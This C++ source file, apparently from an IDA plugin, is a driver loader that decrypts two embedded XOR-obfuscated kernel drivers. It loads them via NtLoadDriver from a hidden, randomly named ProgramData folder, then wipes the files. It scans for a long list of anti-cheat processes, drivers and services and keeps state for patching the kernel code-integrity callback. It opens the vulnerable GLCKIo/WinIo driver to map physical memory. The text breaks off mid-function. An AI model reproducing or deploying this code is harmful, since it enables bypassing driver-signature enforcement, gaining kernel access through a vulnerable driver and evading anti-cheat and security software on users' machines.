

#ifdef __NT__

#include "driver_loader.hpp"


#pragma warning(push)
#pragma warning(disable: 4005)
#pragma warning(disable: 4018)
#pragma warning(disable: 4267)
#include <pro.h>
#include <kernwin.hpp>
#pragma warning(pop)

#include <windows.h>
#include <winternl.h>
#include <winioctl.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <SetupAPI.h>
#include <devguid.h>
#include <cfgmgr32.h>
#include <tlhelp32.h>
#include <algorithm>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <mscat.h>
#include <intrin.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <random>


#include "obfuscation.hpp"


#include "comm.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "cfgmgr32.lib")


#include "whoswho_encrypted.h"


namespace p2c_bytes {
#include "../mapper/src/P2CDriverBytes.h"
}


namespace {


static void dl_msg(const char* fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    char buf[2048];
    qvsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    msg("%s", buf);
}


#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS          ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL     ((NTSTATUS)0xC0000001L)
#endif
#ifndef STATUS_NOT_FOUND
#define STATUS_NOT_FOUND        ((NTSTATUS)0xC0000225L)
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif
#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif
#ifndef STATUS_INVALID_HANDLE
#define STATUS_INVALID_HANDLE   ((NTSTATUS)0xC0000008L)
#endif
#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED    ((NTSTATUS)0xC0000022L)
#endif
#ifndef STATUS_OBJECT_NAME_NOT_FOUND
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#endif
#ifndef STATUS_OBJECT_PATH_NOT_FOUND
#define STATUS_OBJECT_PATH_NOT_FOUND ((NTSTATUS)0xC000003AL)
#endif
#ifndef STATUS_IMAGE_ALREADY_LOADED
#define STATUS_IMAGE_ALREADY_LOADED ((NTSTATUS)0xC000010EL)
#endif
#ifndef STATUS_OBJECT_NAME_COLLISION
#define STATUS_OBJECT_NAME_COLLISION ((NTSTATUS)0xC0000035L)
#endif
#ifndef STATUS_PRIVILEGE_NOT_HELD
#define STATUS_PRIVILEGE_NOT_HELD ((NTSTATUS)0xC0000061L)
#endif
#ifndef STATUS_NOT_SUPPORTED
#define STATUS_NOT_SUPPORTED    ((NTSTATUS)0xC00000BBL)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status)      (((NTSTATUS)(Status)) >= 0)
#endif

#define DL_SE_LOAD_DRIVER_PRIVILEGE  10


#define DL_WINIO_DEVICE_TYPE      0x8010
#define DL_IOCTL_MAP   CTL_CODE(DL_WINIO_DEVICE_TYPE, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DL_IOCTL_UNMAP CTL_CODE(DL_WINIO_DEVICE_TYPE, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)


typedef struct _DL_RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} DL_RTL_PROCESS_MODULE_INFORMATION;

typedef struct _DL_RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    DL_RTL_PROCESS_MODULE_INFORMATION Modules[1];
} DL_RTL_PROCESS_MODULES;

#pragma pack(push, 1)
typedef struct _DL_WINIO_PHYS_MEM {
    LARGE_INTEGER Size;
    LARGE_INTEGER PhysicalAddress;
    HANDLE        SectionHandle;
    PVOID         MappedAddress;
    PVOID         SectionObject;
} DL_WINIO_PHYS_MEM;
#pragma pack(pop)


typedef NTSTATUS(NTAPI* pfnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pfnNtLoadDriver)(PUNICODE_STRING);
typedef NTSTATUS(NTAPI* pfnNtUnloadDriver)(PUNICODE_STRING);
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pfnRtlCreateRegistryKey)(ULONG, PWSTR);
typedef NTSTATUS(NTAPI* pfnRtlWriteRegistryValue)(ULONG, PCWSTR, PCWSTR, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pfnNtDeviceIoControlFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID,
    PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pfnNtDeleteKey)(HANDLE);
typedef NTSTATUS(NTAPI* pfnNtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(NTAPI* pfnNtFlushKey)(HANDLE);

static pfnNtQuerySystemInformation s_NtQuerySystemInformation = nullptr;
static pfnNtLoadDriver             s_NtLoadDriver             = nullptr;
static pfnNtUnloadDriver           s_NtUnloadDriver           = nullptr;
static pfnRtlAdjustPrivilege       s_RtlAdjustPrivilege       = nullptr;
static pfnRtlCreateRegistryKey     s_RtlCreateRegistryKey     = nullptr;
static pfnRtlWriteRegistryValue    s_RtlWriteRegistryValue    = nullptr;
static pfnNtDeviceIoControlFile    s_NtDeviceIoControlFile     = nullptr;
static pfnNtDeleteKey              s_NtDeleteKey               = nullptr;
static pfnNtOpenKey                s_NtOpenKey                 = nullptr;
static pfnNtFlushKey               s_NtFlushKey                = nullptr;


static WCHAR s_LoaderServicePath[128]  = {};
static WCHAR s_DriverServicePath[128]  = {};
static PVOID s_OriginalCiCallback      = nullptr;
static PVOID s_CiCallbackAddress       = nullptr;
static bool  s_CiCallbackPatched       = false;
static bool  s_KernelSigningVerified   = false;
static DWORD s_PatchedFlags            = 0;
static PVOID s_DriverLoadAddress       = nullptr;
static bool  s_DriverLoadedSuccessfully = false;


static unsigned char* s_P2CDriverData = nullptr;
static size_t         s_P2CDriverSize = 0;


static unsigned char* s_WhosWhoData   = nullptr;
static size_t         s_WhosWhoSize   = 0;


static std::wstring GenerateRandomName(size_t length)
{
    static const wchar_t charset[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, static_cast<int>(wcslen(charset) - 1));
    std::wstring result;
    result.reserve(length);
    for (size_t i = 0; i < length; i++)
        result += charset[dist(gen)];
    return result;
}

static BOOL InitializeNtFunctions()
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        ntdll = LoadLibraryW(L"ntdll.dll");
        if (!ntdll) return FALSE;
    }
    s_NtQuerySystemInformation = reinterpret_cast<pfnNtQuerySystemInformation>(GetProcAddress(ntdll, "NtQuerySystemInformation"));
    s_NtLoadDriver       = reinterpret_cast<pfnNtLoadDriver>(GetProcAddress(ntdll, "NtLoadDriver"));
    s_NtUnloadDriver     = reinterpret_cast<pfnNtUnloadDriver>(GetProcAddress(ntdll, "NtUnloadDriver"));
    s_RtlAdjustPrivilege = reinterpret_cast<pfnRtlAdjustPrivilege>(GetProcAddress(ntdll, "RtlAdjustPrivilege"));
    s_RtlCreateRegistryKey   = reinterpret_cast<pfnRtlCreateRegistryKey>(GetProcAddress(ntdll, "RtlCreateRegistryKey"));
    s_RtlWriteRegistryValue  = reinterpret_cast<pfnRtlWriteRegistryValue>(GetProcAddress(ntdll, "RtlWriteRegistryValue"));
    s_NtDeviceIoControlFile  = reinterpret_cast<pfnNtDeviceIoControlFile>(GetProcAddress(ntdll, "NtDeviceIoControlFile"));
    s_NtDeleteKey = reinterpret_cast<pfnNtDeleteKey>(GetProcAddress(ntdll, "NtDeleteKey"));
    s_NtOpenKey   = reinterpret_cast<pfnNtOpenKey>(GetProcAddress(ntdll, "NtOpenKey"));
    s_NtFlushKey  = reinterpret_cast<pfnNtFlushKey>(GetProcAddress(ntdll, "NtFlushKey"));

    return s_NtQuerySystemInformation && s_NtLoadDriver && s_NtUnloadDriver &&
        s_RtlAdjustPrivilege &&
           s_RtlCreateRegistryKey && s_RtlWriteRegistryValue && s_NtDeviceIoControlFile;
}

static NTSTATUS AdjustPrivilege(ULONG privilege, BOOLEAN enable)
{
    BOOLEAN wasEnabled;
    return s_RtlAdjustPrivilege(privilege, enable, FALSE, &wasEnabled);
}

static NTSTATUS GetFullPath(PCWSTR fileName, PWSTR buffer, ULONG bufferLength)
{
    if (!fileName || !buffer || bufferLength == 0)
        return STATUS_INVALID_PARAMETER;

    DWORD copied = GetFullPathNameW(fileName, bufferLength, buffer, nullptr);
    if (copied == 0)
        return HRESULT_FROM_WIN32(GetLastError());
    if (copied >= bufferLength)
        return HRESULT_FROM_WIN32(ERROR_INSUFFICIENT_BUFFER);
    return STATUS_SUCCESS;
}

static BOOL SecureDeleteFile(PCWSTR filePath)
{
    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER fileSize;
        if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 0) {
            BYTE zeroBuffer[4096];
            SecureZeroMemory(zeroBuffer, sizeof(zeroBuffer));
            SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
            LONGLONG remaining = fileSize.QuadPart;
            while (remaining > 0) {
                DWORD toWrite = static_cast<DWORD>((std::min)(static_cast<LONGLONG>(4096), remaining));
                DWORD written = 0;
                WriteFile(hFile, zeroBuffer, toWrite, &written, nullptr);
                remaining -= written;
                if (written == 0) break;
            }
            FlushFileBuffers(hFile);
        }
        CloseHandle(hFile);
    }
    SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);
    return DeleteFileW(filePath);
}

static std::wstring s_RandomExtractDir;

static bool CreateRandomExtractDirectory()
{
    WCHAR programData[MAX_PATH + 1] = {};
    DWORD pdLen = GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH);
    if (pdLen == 0 || pdLen > MAX_PATH) {
        WCHAR sysDrive[8] = {};
        DWORD sdLen = GetEnvironmentVariableW(L"SystemDrive", sysDrive, _countof(sysDrive));
        if (sdLen == 0 || sdLen >= _countof(sysDrive)) {
            sysDrive[0] = L'C'; sysDrive[1] = L':'; sysDrive[2] = L'\0';
        }
        wcscpy_s(programData, sysDrive);
        wcscat_s(programData, L"\\ProgramData");
    }

    std::wstring dirPath = programData;
    dirPath += L"\\";
    dirPath += GenerateRandomName(8);
    dirPath += L"-";
    dirPath += GenerateRandomName(4);
    dirPath += L"-";
    dirPath += GenerateRandomName(4);
    dirPath += L"-";
    dirPath += GenerateRandomName(12);

    if (!CreateDirectoryW(dirPath.c_str(), nullptr)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS)
            return false;
    }

    SetFileAttributesW(dirPath.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);

    s_RandomExtractDir = dirPath;
    return true;
}

static std::wstring GetRandomFilePath(PCWSTR extension)
{
    if (s_RandomExtractDir.empty()) return L"";
    std::wstring name = GenerateRandomName(16);
    return s_RandomExtractDir + L"\\" + name + extension;
}

static void CleanupRandomExtractDirectory()
{
    if (s_RandomExtractDir.empty()) return;
    SetFileAttributesW(s_RandomExtractDir.c_str(), FILE_ATTRIBUTE_NORMAL);
    RemoveDirectoryW(s_RandomExtractDir.c_str());
    s_RandomExtractDir.clear();
}

static BOOL ForceDeleteDriverFile(PCWSTR filePath)
{
    if (!filePath) return FALSE;
    if (GetFileAttributesW(filePath) == INVALID_FILE_ATTRIBUTES) return TRUE;

    bool contentZeroed = false;
    {
        DWORD shareCombinations[] = {
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_SHARE_DELETE,
            0
        };
        for (int s = 0; s < _countof(shareCombinations) && !contentZeroed; s++) {
            HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE,
                shareCombinations[s], nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hFile != INVALID_HANDLE_VALUE) {
                LARGE_INTEGER fileSize;
                if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 0) {
                    BYTE zeroBuffer[4096];
                    SecureZeroMemory(zeroBuffer, sizeof(zeroBuffer));
                    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                    LONGLONG remaining = fileSize.QuadPart;
                    while (remaining > 0) {
                        DWORD toWrite = static_cast<DWORD>((std::min)(static_cast<LONGLONG>(4096), remaining));
                        DWORD written = 0;
                        if (!WriteFile(hFile, zeroBuffer, toWrite, &written, nullptr) || written == 0) break;
                        remaining -= written;
                    }
                    if (remaining <= 0) contentZeroed = true;
                    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                    SetEndOfFile(hFile);
                    FlushFileBuffers(hFile);
                }
                CloseHandle(hFile);
            }
        }
    }

    for (int attempt = 0; attempt < 15; attempt++) {
        SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);
        if (DeleteFileW(filePath)) return TRUE;
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) return TRUE;
        Sleep((attempt < 3) ? (50U << attempt) : 200U);
    }

    {
        HANDLE hFile = CreateFileW(filePath, DELETE | SYNCHRONIZE,
            FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
            OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, nullptr);
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            if (GetFileAttributesW(filePath) == INVALID_FILE_ATTRIBUTES) return TRUE;
        }
    }

    MoveFileExW(filePath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    return FALSE;
}


static constexpr unsigned char P2C_XOR_KEY[] = {
    0x7A, 0xC3, 0x91, 0xE5, 0x3D, 0xF8, 0x46, 0xAB,
    0x1F, 0x82, 0xD7, 0x54, 0x69, 0xBE, 0x03, 0xC6
};

static BOOL DecryptP2CDriver()
{
    if (p2c_bytes::rawDataSize < 2) return FALSE;
    s_P2CDriverData = static_cast<unsigned char*>(
        VirtualAlloc(nullptr, p2c_bytes::rawDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!s_P2CDriverData) return FALSE;
    for (size_t i = 0; i < p2c_bytes::rawDataSize; i++)
        s_P2CDriverData[i] = p2c_bytes::rawData[i] ^ P2C_XOR_KEY[i % sizeof(P2C_XOR_KEY)];
    if (s_P2CDriverData[0] != 'M' || s_P2CDriverData[1] != 'Z') {
        SecureZeroMemory(s_P2CDriverData, p2c_bytes::rawDataSize);
        VirtualFree(s_P2CDriverData, 0, MEM_RELEASE);
        s_P2CDriverData = nullptr;
        return FALSE;
    }
    s_P2CDriverSize = p2c_bytes::rawDataSize;
    return TRUE;
}

static void ReleaseP2CDriver()
{
    if (s_P2CDriverData) {
        SecureZeroMemory(s_P2CDriverData, s_P2CDriverSize);
        VirtualFree(s_P2CDriverData, 0, MEM_RELEASE);
        s_P2CDriverData = nullptr;
        s_P2CDriverSize = 0;
    }
}

static constexpr unsigned char WHOSWHO_XOR_KEY[] = {
    0xA3, 0x5F, 0x17, 0xD2, 0x8B, 0x64, 0xE9, 0x31,
    0xCC, 0x4A, 0x76, 0xF0, 0x0E, 0x93, 0xB8, 0x2D
};

static BOOL DecryptWhosWhoDriver()
{
    if (g_whoswho_encrypted_size < 2) return FALSE;
    s_WhosWhoData = static_cast<unsigned char*>(
        VirtualAlloc(nullptr, g_whoswho_encrypted_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!s_WhosWhoData) return FALSE;
    for (size_t i = 0; i < g_whoswho_encrypted_size; i++)
        s_WhosWhoData[i] = g_whoswho_encrypted[i] ^ WHOSWHO_XOR_KEY[i % sizeof(WHOSWHO_XOR_KEY)];
    if (s_WhosWhoData[0] != 'M' || s_WhosWhoData[1] != 'Z') {
        SecureZeroMemory(s_WhosWhoData, g_whoswho_encrypted_size);
        VirtualFree(s_WhosWhoData, 0, MEM_RELEASE);
        s_WhosWhoData = nullptr;
        return FALSE;
    }
    s_WhosWhoSize = g_whoswho_encrypted_size;
    return TRUE;
}

static void ReleaseWhosWhoDriver()
{
    if (s_WhosWhoData) {
        SecureZeroMemory(s_WhosWhoData, s_WhosWhoSize);
        VirtualFree(s_WhosWhoData, 0, MEM_RELEASE);
        s_WhosWhoData = nullptr;
        s_WhosWhoSize = 0;
    }
}


static const wchar_t* s_AntiCheatProcesses[] = {
    L"BEService.exe", L"BEService_x64.exe",
    L"EasyAntiCheat.exe", L"EasyAntiCheat_EOS.exe",
    L"EasyAntiCheat_Setup.exe", L"EasyAntiCheat_EOS_Setup.exe",
    L"vgk.exe", L"vgtray.exe",
    L"faceitclient.exe", L"faceit_service.exe",
    L"eseaservice.exe", L"nprotect.exe", L"GameMon.des",
    L"TslGame_BE.exe", L"PnkBstrA.exe", L"PnkBstrB.exe",
    L"mracsvc.exe", L"equ8_helper.exe",
    L"SGuardSvc64.exe", L"SGuardSvc.exe", L"ACEHelper.exe"
};

static const wchar_t* s_AntiCheatDrivers[] = {
    L"BEDaisy.sys", L"bedaisy.sys",
    L"EasyAntiCheat.sys", L"EasyAntiCheat_EOS.sys",
    L"vgk.sys", L"RandGrid.sys",
    L"FACEIT.sys", L"esea.sys", L"eseadriver2.sys",
    L"xhunter1.sys", L"xkqd.sys", L"npgg.sys", L"nprobes.sys",
    L"mhyprot2.sys", L"HoYoKProtect.sys",
    L"ACE-BASE.sys", L"ACE-Guard.sys", L"TesSafe.sys",
    L"aow_drv_x64_ev.sys", L"PnkBstrK.sys",
    L"mrac.sys", L"mrac1.sys", L"Lionic.sys", L"atc.sys",
    L"BadlionAnticheat.sys", L"navagio.sys", L"uncheater.sys",
    L"Saber.sys", L"ricochet.sys", L"EQU8_HELPER_63.sys"
};

static const wchar_t* s_AntiCheatServices[] = {
    L"BEService", L"BEDaisy",
    L"EasyAntiCheat", L"EasyAntiCheat_EOS",
    L"vgk", L"vgkbootstatus",
    L"FaceItService", L"ESEAService2",
    L"PnkBstrA", L"PnkBstrB",
    L"mhyprot2", L"HoYoKProtect",
    L"ACE-BASE", L"ACE-Guard", L"TesSafe",
    L"mrac", L"EQU8_HELPER"
};

static std::wstring DetectRunningAntiCheat()
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                for (int i = 0; i < _countof(s_AntiCheatProcesses); i++) {
                    if (_wcsicmp(pe32.szExeFile, s_AntiCheatProcesses[i]) == 0) {
                        std::wstring detected = pe32.szExeFile;
                        CloseHandle(hSnapshot);
                        return detected;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    LPVOID driverAddrs[2048];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(driverAddrs, sizeof(driverAddrs), &cbNeeded)) {
        DWORD driverCount = cbNeeded / sizeof(LPVOID);
        if (driverCount > 2048) driverCount = 2048;
        for (DWORD i = 0; i < driverCount; i++) {
            WCHAR driverName[256];
            if (GetDeviceDriverBaseNameW(driverAddrs[i], driverName, 256)) {
                for (int j = 0; j < _countof(s_AntiCheatDrivers); j++) {
                    if (_wcsicmp(driverName, s_AntiCheatDrivers[j]) == 0) {
                        return driverName;
                    }
                }
            }
        }
    }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCM) {
        for (int i = 0; i < _countof(s_AntiCheatServices); i++) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, s_AntiCheatServices[i], SERVICE_QUERY_STATUS);
            if (hSvc) {
                SERVICE_STATUS_PROCESS ssp = {};
                DWORD needed = 0;
                if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                    (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                    if (ssp.dwCurrentState == SERVICE_RUNNING ||
                        ssp.dwCurrentState == SERVICE_START_PENDING) {
                        std::wstring detected = s_AntiCheatServices[i];
                        CloseServiceHandle(hSvc);
                        CloseServiceHandle(hSCM);
                        return detected;
                    }
                }
                CloseServiceHandle(hSvc);
            }
        }
        CloseServiceHandle(hSCM);
    }
    return L"";
}


static NTSTATUS CreateDriverService(PWSTR servicePath, PCWSTR filePath)
{
    if (!servicePath || !filePath || !*filePath)
        return STATUS_INVALID_PARAMETER;

    const WCHAR prefix[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
    SIZE_T prefixLen = wcslen(prefix);
    wmemcpy(servicePath, prefix, prefixLen);

    PCWSTR lastSlash = filePath;
    for (PCWSTR p = filePath; *p; p++) {
        if (*p == L'\\') lastSlash = p + 1;
    }

    SIZE_T pathLen = prefixLen;
    for (PCWSTR n = lastSlash; *n && *n != L'.' && pathLen < 126; n++, pathLen++)
        servicePath[pathLen] = *n;
    servicePath[pathLen] = L'\0';

    NTSTATUS status = s_RtlCreateRegistryKey(0, servicePath);
    if (!NT_SUCCESS(status)) return status;

    std::wstring ntPath = L"\\??\\";
    ntPath += filePath;
    SIZE_T ntPathLen = ntPath.length();

    status = s_RtlWriteRegistryValue(0, servicePath, L"ImagePath", REG_SZ,
        const_cast<PWSTR>(ntPath.c_str()), static_cast<ULONG>((ntPathLen + 1) * sizeof(WCHAR)));
    if (!NT_SUCCESS(status)) return status;

    DWORD typeValue = 1;
    status = s_RtlWriteRegistryValue(0, servicePath, L"Type", REG_DWORD,
        &typeValue, sizeof(DWORD));
    return status;
}

static NTSTATUS LoadDriverSvc(PCWSTR servicePath)
{
    UNICODE_STRING us;
    RtlInitUnicodeString(&us, servicePath);
    return s_NtLoadDriver(&us);
}

static NTSTATUS UnloadDriverSvc(PCWSTR servicePath)
{
    UNICODE_STRING us;
    RtlInitUnicodeString(&us, servicePath);
    return s_NtUnloadDriver(&us);
}


static const GUID DL_GUID_GIO =
    { 0x70a35746, 0x5d4c, 0x4d58, { 0xb6, 0xc5, 0xc6, 0xef, 0x26, 0xf6, 0x4e, 0x7e } };
static const GUID DL_GUID_GIO_ALT =
    { 0x4d36e97d, 0xe325, 0x11ce, { 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18 } };

static const wchar_t* s_VulnDeviceNames[] = {
    L"\\??\\GLCKIo",
    L"\\Device\\GLCKIo",
    L"\\DosDevices\\GLCKIo"
};

static BOOL TryOpenDeviceInterface(const GUID* interfaceGuid, PHANDLE deviceHandle)
{
    HDEVINFO dis = SetupDiGetClassDevsW(interfaceGuid, nullptr, nullptr,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    if (dis == INVALID_HANDLE_VALUE) return FALSE;

    SP_DEVICE_INTERFACE_DATA idata = {};
    idata.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    for (DWORD idx = 0; SetupDiEnumDeviceInterfaces(dis, nullptr, interfaceGuid, idx, &idata); idx++) {
        DWORD reqSize = 0;
        SetupDiGetDeviceInterfaceDetailW(dis, &idata, nullptr, 0, &reqSize, nullptr);
        if (reqSize == 0) continue;
        PSP_DEVICE_INTERFACE_DETAIL_DATA_W dd = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)
            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reqSize);
        if (!dd) continue;
        dd->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
        if (SetupDiGetDeviceInterfaceDetailW(dis, &idata, dd, reqSize, nullptr, nullptr)) {
            HANDLE h = CreateFileW(dd->DevicePath, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, nullptr);
            HeapFree(GetProcessHeap(), 0, dd);
            if (h != INVALID_HANDLE_VALUE) {
                SetupDiDestroyDeviceInfoList(dis);
                *deviceHandle = h;
                return TRUE;
            }
        } else {
            HeapFree(GetProcessHeap(), 0, dd);
        }
    }
    SetupDiDestroyDeviceInfoList(dis);
    return FALSE;
}

static BOOL TryOpenViaCfgMgr(PHANDLE deviceHandle)
{
    const GUID* guids[] = { &DL_GUID_GIO, &DL_GUID_GIO_ALT, &GUID_DEVCLASS_SYSTEM };
    for (int g = 0; g < _countof(guids); g++) {
        ULONG bufLen = 0;
        if (CM_Get_Device_Interface_List_SizeW(&bufLen, const_cast<LPGUID>(guids[g]),
            nullptr, CM_GET_DEVICE_INTERFACE_LIST_PRESENT) != CR_SUCCESS || bufLen <= 1)
            continue;
        PWSTR devList = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufLen * sizeof(WCHAR));
        if (!devList) continue;
        if (CM_Get_Device_Interface_ListW(const_cast<LPGUID>(guids[g]), nullptr,
            devList, bufLen, CM_GET_DEVICE_INTERFACE_LIST_PRESENT) == CR_SUCCESS) {
            for (PWSTR cur = devList; *cur; cur += wcslen(cur) + 1) {
                if (wcsstr(cur, L"GLCK") || wcsstr(cur, L"glck") ||
                    wcsstr(cur, L"GLCKIo") || wcsstr(cur, L"glckio")) {
                    HANDLE h = CreateFileW(cur, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (h != INVALID_HANDLE_VALUE) {
                        HeapFree(GetProcessHeap(), 0, devList);
                        *deviceHandle = h;
                        return TRUE;
                    }
                }
            }
        }
        HeapFree(GetProcessHeap(), 0, devList);
    }
    return FALSE;
}

static NTSTATUS VulnOpenDevice(PHANDLE deviceHandle)
{
    if (!deviceHandle) return STATUS_INVALID_PARAMETER;
    *deviceHandle = nullptr;
    if (TryOpenDeviceInterface(&DL_GUID_GIO, deviceHandle)) return STATUS_SUCCESS;
    if (TryOpenDeviceInterface(&DL_GUID_GIO_ALT, deviceHandle)) return STATUS_SUCCESS;
    if (TryOpenViaCfgMgr(deviceHandle)) return STATUS_SUCCESS;

    NTSTATUS lastStatus = STATUS_OBJECT_NAME_NOT_FOUND;
    for (int i = 0; i < _countof(s_VulnDeviceNames); i++) {
        UNICODE_STRING dn;
        USHORT len = static_cast<USHORT>(wcslen(s_VulnDeviceNames[i]) * sizeof(wchar_t));
        dn.Length = len; dn.MaximumLength = len + sizeof(wchar_t);
        dn.Buffer = const_cast<PWSTR>(s_VulnDeviceNames[i]);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &dn, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
        IO_STATUS_BLOCK io = {};
        NTSTATUS st = NtCreateFile(deviceHandle, SYNCHRONIZE | FILE_READ_DATA | FILE_WRITE_DATA,
            &oa, &io, nullptr, FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0);
        lastStatus = st;
        if (NT_SUCCESS(st)) return st;
    }
    return lastStatus;
}

static void VulnCloseDevice(HANDLE h)
{
    if (h && h != INVALID_HANDLE_VALUE) NtClose(h);
}


static constexpr int MAP_CACHE_SIZE = 8;
static DL_WINIO_PHYS_MEM s_MapCache[MAP_CACHE_SIZE] = {};
static int s_MapCacheCount = 0;

static void CacheMapResult(const DL_WINIO_PHYS_MEM& r)
{
    if (s_MapCacheCount < MAP_CACHE_SIZE) s_MapCache[s_MapCacheCount++] = r;
    else s_MapCache[MAP_CACHE_SIZE - 1] = r;
}

static DL_WINIO_PHYS_MEM* FindCachedMap(PVOID addr)
{
    for (int i = 0; i < s_MapCacheCount; i++)
        if (s_MapCache[i].MappedAddress == addr) return &s_MapCache[i];
    return nullptr;
}

static void RemoveCachedMap(PVOID addr)
{
    for (int i = 0; i < s_MapCacheCount; i++) {
        if (s_MapCache[i].MappedAddress == addr) {
            for (int j = i; j < s_MapCacheCount - 1; j++)
                s_MapCache[j] = s_MapCache[j + 1];
            s_MapCacheCount--;
            memset(&s_MapCache[s_MapCacheCount], 0, sizeof(DL_WINIO_PHYS_MEM));
            return;
        }
    }
}

static NTSTATUS VulnMapPhysicalMemory(HANDLE dev, ULONGLONG physAddr, ULONG sz, PVOID* mapped)
{
    if (dev == nullptr || dev == INVALID_HANDLE_VALUE) return STATUS_INVALID_HANDLE;
    if (!mapped || sz == 0) return STATUS_INVALID_PARAMETER;
    DL_WINIO_PHYS_MEM io = {};
    io.Size.QuadPart = static_cast<LONGLONG>(sz);
